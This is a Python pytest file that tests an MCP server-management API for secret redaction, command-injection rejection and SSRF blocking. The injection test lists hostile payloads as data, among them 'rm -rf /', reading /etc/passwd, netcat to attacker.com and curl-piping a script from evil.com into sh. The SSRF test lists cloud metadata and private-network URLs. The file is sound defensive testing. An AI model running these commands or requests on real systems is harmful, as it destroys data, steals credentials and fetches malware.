"""Security tests for server-side MCP feature.

Verifies credential sanitization, command injection prevention, and SSRF protection.
"""

import json
import os
from pathlib import Path

import pytest
from httpx import AsyncClient


class TestCredentialIsolation:
    """Security tests for credential isolation and sanitization."""

    @pytest.mark.anyio
    async def test_application_config_env_vars_not_leaked(
        self,
        async_client: AsyncClient,
        auth_headers: dict[str, str],
        tmp_path: Path,
    ) -> None:
        """Test that application config env vars are redacted in API responses.

        Verifies:
        - Environment variables with sensitive names are redacted
        - Actual secret values never appear in API responses
        - Sanitization applies to all sensitive key patterns
        """
        # Set a secret env var for testing
        os.environ["TEST_SECRET_KEY"] = "super_secret_value_12345"
        os.environ["TEST_API_KEY"] = "api_key_secret_value"
        os.environ["TEST_PASSWORD"] = "password_secret_value"

        try:
            # Create application config with env var references
            # Use .mcp.json (filesystem discovery looks for this file)
            config_file = tmp_path / ".mcp.json"
            config_data = {
                "mcpServers": {
                    "test-server": {
                        "command": "npx",
                        "args": ["-y", "@test/server"],
                        "env": {
                            "SECRET_KEY": "${TEST_SECRET_KEY}",
                            "API_KEY": "${TEST_API_KEY}",
                            "PASSWORD": "${TEST_PASSWORD}",
                            "SAFE_VALUE": "not_secret",
                        },
                    }
                }
            }
            config_file.write_text(json.dumps(config_data, indent=2))

            # Change to temp directory (filesystem discovery looks at cwd)
            original_cwd = Path.cwd()
            os.chdir(tmp_path)

            try:
                # Query MCP servers list endpoint
                response = await async_client.get(
                    "/api/v1/mcp-servers",
                    headers=auth_headers,
                )
                assert response.status_code == 200

                data = response.json()
                servers = data.get("servers", [])

                # Find our test server
                test_server = next(
                    (s for s in servers if s.get("name") == "test-server"), None
                )
                assert test_server is not None, "Test server not found in response"

                # Verify sensitive env vars are redacted
                env = test_server.get("env", {})
                assert env.get("SECRET_KEY") == "***REDACTED***", (
                    "SECRET_KEY should be redacted"
                )
                assert env.get("API_KEY") == "***REDACTED***", (
                    "API_KEY should be redacted"
                )
                assert env.get("PASSWORD") == "***REDACTED***", (
                    "PASSWORD should be redacted"
                )

                # Verify safe values are NOT redacted
                assert env.get("SAFE_VALUE") == "not_secret", (
                    "Non-sensitive values should not be redacted"
                )

                # Verify actual secret values NEVER appear in response
                response_text = response.text
                assert "super_secret_value_12345" not in response_text, (
                    "Secret env var value leaked in response!"
                )
                assert "api_key_secret_value" not in response_text, (
                    "API key value leaked in response!"
                )
                assert "password_secret_value" not in response_text, (
                    "Password value leaked in response!"
                )

            finally:
                # Restore original working directory
                os.chdir(original_cwd)

        finally:
            # Clean up env vars
            os.environ.pop("TEST_SECRET_KEY", None)
            os.environ.pop("TEST_API_KEY", None)
            os.environ.pop("TEST_PASSWORD", None)


class TestCommandInjectionPrevention:
    """Security tests for command injection prevention."""

    @pytest.mark.anyio
    async def test_command_injection_rejected(
        self,
        async_client: AsyncClient,
        auth_headers: dict[str, str],
    ) -> None:
        """Test that command injection attempts are rejected.

        Verifies:
        - Commands with shell metacharacters are rejected
        - Dangerous command sequences are blocked
        - Proper error response returned (400 Bad Request)
        """
        # Test various command injection payloads
        injection_payloads = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(whoami)",
            "; curl http://evil.com/malware.sh | sh",
        ]

        for payload in injection_payloads:
            # Attempt to create MCP server with malicious command
            response = await async_client.post(
                "/api/v1/mcp-servers",
                json={
                    "name": "malicious-server",
                    "transport_type": "stdio",
                    "command": f"npx{payload}",
                    "args": ["-y", "@test/server"],
                },
                headers=auth_headers,
            )

            # Should reject with 400 or 422 (validation error)
            assert response.status_code in (400, 422), (
                f"Command injection payload should be rejected: {payload} "
                f"(got {response.status_code})"
            )

            # Verify error response structure
            data = response.json()
            assert "error" in data or "detail" in data, (
                f"Response should contain error information: {data}"
            )


class TestSSRFPrevention:
    """Security tests for SSRF (Server-Side Request Forgery) prevention."""

    @pytest.mark.anyio
    async def test_ssrf_attempts_blocked(
        self,
        async_client: AsyncClient,
        auth_headers: dict[str, str],
    ) -> None:
        """Test that SSRF attempts are blocked.

        Verifies:
        - Internal/private IP addresses are rejected
        - Cloud metadata endpoints are blocked
        - Localhost variants are blocked
        """
        # Test various SSRF payloads targeting internal resources
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://127.0.0.1:8080/admin",  # Localhost
            "http://localhost/admin",  # Localhost variant
            "http://0.0.0.0/",  # All interfaces
            "http://10.0.0.1/internal",  # Private IP (Class A)
            "http://172.16.0.1/internal",  # Private IP (Class B)
            "http://192.168.1.1/admin",  # Private IP (Class C)
        ]

        for payload in ssrf_payloads:
            # Attempt to create MCP server with internal URL
            response = await async_client.post(
                "/api/v1/mcp-servers",
                json={
                    "name": "ssrf-server",
                    "transport_type": "sse",
                    "url": payload,
                },
                headers=auth_headers,
            )

            # Should reject with 400 or 422
            assert response.status_code in (400, 422), (
                f"SSRF payload should be rejected: {payload} "
                f"(got {response.status_code})"
            )

            # Verify error response structure
            data = response.json()
            assert "error" in data or "detail" in data, (
                f"Response should contain error information: {data}"
            )
